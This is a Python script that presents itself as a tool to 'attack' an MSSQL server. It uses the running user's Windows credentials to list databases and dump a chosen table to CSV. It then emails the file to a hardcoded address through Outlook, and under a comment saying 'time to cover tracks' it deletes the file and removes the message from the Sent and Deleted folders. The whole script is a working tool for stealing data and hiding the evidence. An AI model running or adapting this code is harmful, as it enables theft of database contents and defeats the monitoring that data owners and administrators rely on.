#! /bin/python

import os
import pip
import sys
import time

# pip installs libraries onto system if not already done
if not 'csv' in sys.modules.keys():
    pip.main(['install', 'csv'])
if not 'pyodbc' in sys.modules.keys():
    pip.main(['install', 'pyodbc'])
if not 'pywin32' in sys.modules.keys():
    pip.main(['install', 'pywin32'])


try:
    import csv
except ImportError as e:
    pass
try:
    import pyodbc
except ImportError as e:
    pass
try:    
    import win32com.client
except ImportError as e:
    pass


server = input('Please input the name or IP address of the MSSQL Server you would like to attack: ')
# switch out with your email address
my_email = ['email@email.com']



# function to be called later that puts together and sends an email using outlook
def send_outlook_html_mail(recipients, subject='No Subject', body='Blank', send_or_display='Display', copies=None):
    """
    Send an Outlook HTML Customer_Email
    :param recipients: list of recipients' Customer_Email addresses (list object)
    :param subject: subject of the Customer_Email
    :param body: HTML body of the Customer_Email
    :param send_or_display: Send - send Customer_Email automatically | Display - Customer_Email gets created user have to click Send
    :param copies: list of CCs' Customer_Email addresses
    :return: None
    """
    outlook = win32com.client.Dispatch("Outlook.Application")

    ol_msg = outlook.CreateItem(0)

    str_to = ""
    for recipient in recipients:
        str_to += recipient + ";"

    ol_msg.To = str_to

    if copies is not None:
        str_cc = ""
        for cc in copies:
            str_cc += cc + ";"

        ol_msg.CC = str_cc

    ol_msg.Subject = subject
    ol_msg.HTMLBody = body

    ol_msg.Attachments.Add(os.getcwd() + '\\data.csv')

    if send_or_display.upper() == 'SEND':
        ol_msg.Send()
    else:
        ol_msg.Display()






database = []
driver_name = ''

# pulls in name of 1st ODBC driver to connect to SQL Server
driver_names = [x for x in pyodbc.drivers() if x.endswith(' for SQL Server')]
if driver_names:
    driver_name = driver_names[0]
if driver_name:
    cnxn = pyodbc.connect('DRIVER={' + driver_name + '};SERVER=' + server +
                          '; trusted_connection=YES;')
    cursor = cnxn.cursor()
    query = 'select name FROM sys.databases'
    cursor.execute(query)
    database = cursor.fetchall()
else:
    print('(No suitable driver found. Cannot connect.)')
    sys.exit()

cnxn.close()
print('List of databases:')
for row in database:
    print(row[0])
db = input('Please input the database you would like to view: ')
cnxn = pyodbc.connect('DRIVER={' + driver_name + '};SERVER=' + server +
                      ';DATABASE=' + str(db) + '; trusted_connection=YES;')
cursor = cnxn.cursor()
query = 'SELECT * FROM INFORMATION_SCHEMA.TABLES'
cursor.execute(query)
database2 = cursor.fetchall()
print('List of table:')
for row in database2:
    print(row[2])
table = input('Please input the table you would like to view: ')
query2 = 'SELECT * FROM ' + table
cursor.execute(query2)
database3 = cursor.fetchall()
with open('data.csv', 'w') as f: 
    write = csv.writer(f)
    write.writerows(database3) 


# Takes csv created in previous steps and emails it to an email of your choice
# Hard coded email subject
MAIL_SUBJECT = 'data'
# Hard coded email HTML text
MAIL_BODY =\
    '<html> ' \
    '<body>' \
    '<p> Hello <br><br>'\
    '</p>' \
    '</body>' \
    '</html>'
if __name__ == '__main__':
    recipient = my_email
    send_outlook_html_mail(
        recipients=recipient, subject=MAIL_SUBJECT, body=MAIL_BODY, send_or_display='SEND', copies=None)


# time to cover tracks
os.remove('data.csv')

time.sleep(5)
outlook = win32com.client.Dispatch("Outlook.Application").GetNamespace("MAPI")
sent = outlook.GetDefaultFolder(5)
# access to the email in the inbox
messages = sent.Items
# get the first email
message = messages.GetLast()
message.Delete()

deleted = outlook.GetDefaultFolder(3)
# access to the email in the inbox
messages = deleted.Items
# get the first email
message = messages.GetLast()
message.Delete()
sys.exit()
